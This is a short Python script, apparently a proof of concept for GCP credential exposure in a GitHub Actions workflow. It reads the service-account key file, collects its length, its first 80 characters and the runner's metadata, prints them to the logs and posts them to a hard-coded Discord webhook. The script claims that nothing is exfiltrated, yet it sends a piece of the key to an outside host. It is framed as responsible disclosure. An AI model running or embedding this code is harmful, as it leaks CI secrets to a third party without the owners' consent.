import json
import os
import urllib.request

webhook = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

cred_path = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "NOT_SET")
cred_info = "NOT_SET"
cred_prefix = ""
project = os.environ.get("CLOUDSDK_CORE_PROJECT", os.environ.get("GCP_PROJECT", "unknown"))

if os.path.isfile(cred_path):
    data = open(cred_path).read()
    cred_info = f"EXISTS ({len(data)} bytes)"
    cred_prefix = data[:80].replace("\n", " ")

msg = (
    "**PoC: google/adk-samples GCP credential exposure**\n"
    "```\n"
    f"Repo: {os.environ.get('GITHUB_REPOSITORY', 'unknown')}\n"
    f"Run ID: {os.environ.get('GITHUB_RUN_ID', 'unknown')}\n"
    f"Event: {os.environ.get('GITHUB_EVENT_NAME', 'unknown')}\n"
    f"Runner: {os.environ.get('RUNNER_NAME', 'unknown')}\n"
    f"GCP Project: {project}\n"
    "\n"
    f"GOOGLE_APPLICATION_CREDENTIALS: {cred_path}\n"
    f"SA Key: {cred_info}\n"
    f"SA Key prefix: {cred_prefix}\n"
    "```\n"
    "No credentials exfiltrated. Prefix+length only.\n"
    "Reported to Google OSS VRP."
)

# Print proof to stdout (visible in workflow logs)
print("=" * 60)
print("[PoC] GCP Credential Access Proof")
print("=" * 60)
print(f"Repo: {os.environ.get('GITHUB_REPOSITORY', 'unknown')}")
print(f"Run ID: {os.environ.get('GITHUB_RUN_ID', 'unknown')}")
print(f"Event: {os.environ.get('GITHUB_EVENT_NAME', 'unknown')}")
print(f"GCP Project: {project}")
print(f"GOOGLE_APPLICATION_CREDENTIALS: {cred_path}")
print(f"SA Key: {cred_info}")
print(f"SA Key prefix (first 80 chars): {cred_prefix}")
print("=" * 60)
print("No credentials exfiltrated. Responsible disclosure PoC.")

# Try webhook (may be blocked by network)
payload = json.dumps({"content": msg}).encode()
req = urllib.request.Request(webhook, data=payload, headers={"Content-Type": "application/json"})
try:
    urllib.request.urlopen(req, timeout=10)
    print("[PoC] Webhook also sent to Discord")
except Exception as e:
    print(f"[PoC] Webhook blocked (network restriction): {e}")
    print("[PoC] Proof is in the workflow logs above")
